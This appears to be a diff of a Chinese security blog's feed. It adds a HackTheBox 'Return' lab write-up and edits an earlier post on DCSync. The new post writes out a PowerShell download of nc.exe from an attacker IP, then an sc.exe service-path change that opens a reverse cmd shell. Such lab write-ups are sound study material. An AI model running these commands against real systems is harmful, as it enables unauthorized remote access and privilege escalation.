@@ -1048,7 +1048,8 @@
 
 <p>再看看这个组的情况，net localgroup “Remote Management Users”</p>
 <p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409195851.png" ></p>
-<p>发现存在DCSync 攻击</p>
+<p>“ Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.”</p>
+<p>该组成员具有远程管理系统的能力，权限达到管理，所以存在DCSync 攻击</p>
 <blockquote>
 <p>在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。</p>
 <p>DCSync 是域渗透中经常会用到的技术，其被整合在了 Mimikatz 中。在 DCSync 功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。</p>
@@ -1062,6 +1063,41 @@
 <h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>思路：网页发现用户名–&gt;生成字典–&gt;查看是否有用户不需要Kerberos 预⾝份验证–&gt;拿到第一个账号密码–&gt;提权工具找到自动登录的账户密码–&gt;查看域内信息–&gt;发现DCSync 攻击–&gt;抓到管理员的hash–&gt;提权成功</p>
 <p>新的知识点：Kerberos 预⾝份验证，自动化提权检测工具，DCSync 攻击。。</p>
 <p>本来想试一下BloodHound查看域内信息，总是失败，不过看官方题解也能懂，可惜就记录不下来了</p>
+]]></content>
+      <tags>
+        <tag>复盘</tag>
+        <tag>htb</tag>
+        <tag>windows</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>htb return复盘</title>
+    <url>/2024/04/09/htb-return%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[<p>这个靶机比较简单，就边做边记录了📝</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
+<p><a class="link"   href="https://zhuanlan.zhihu.com/p/440073688" >https://zhuanlan.zhihu.com/p/440073688<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.csdn.net/Purpose_7/article/details/128562358" >https://blog.csdn.net/Purpose_7/article/details/128562358<i class="fas fa-external-link-alt"></i></a></p>
+<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Return" >https://app.hackthebox.com/machines/Return<i class="fas fa-external-link-alt"></i></a></p>
+<p>难度：我觉得比easy还easy</p>
+<p>ip：10.10.11.108</p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204704.png"   style="zoom:50%;" >
+
+<p>扫到很多端口，先看看80端口，有个setting.php，起始长这样</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204749.png" ></p>
+<p>像是在配置一个服务，需要填address，389对于ldap服务</p>
+<p>思路是把地址改成本地ip，本地开启监听389端口，点击update，收到一串密码</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409204957.png" ></p>
+<p>用来登录svc-printer账户，没想到第一个flag拿的这么轻松</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>看一下svc-printer账户详情</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-09%2021.03.47.png" ></p>
+<p>他有Server Operator权限，“<strong>Members of this group can start&#x2F;stop system services</strong>”</p>
+<p>那接下来的思路就是上传一个nc.exe，停止某个服务，修改某个服务的路径，再启动服务，就会反弹shell</p>
+<p>这里选的服务是Windows自带的卷影复制服务<code>vss</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.16.3/nc64.exe&#x27;,&#x27;C:\Users\svc-printer\desktop\nc.exe&#x27;)&quot;</span><br><span class="line"># 下载一个nc.exe</span><br><span class="line">sc.exe stop vss # 停止vss</span><br><span class="line">sc.exe config vss binPath=&quot;C:\Users\svc-printer\desktop\nc.exe -e cmd.exe 10.10.16.3 8888&quot; # 修改服务路径</span><br><span class="line">sc.exe start vss # 开启服务</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409210956.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409211018.png" ></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>目前遇到最简单的windows靶机，虽然开了很多端口但是没什么用，学习到Server Operator权限相关内容，不错</p>
 ]]></content>
       <tags>
         <tag>复盘</tag>
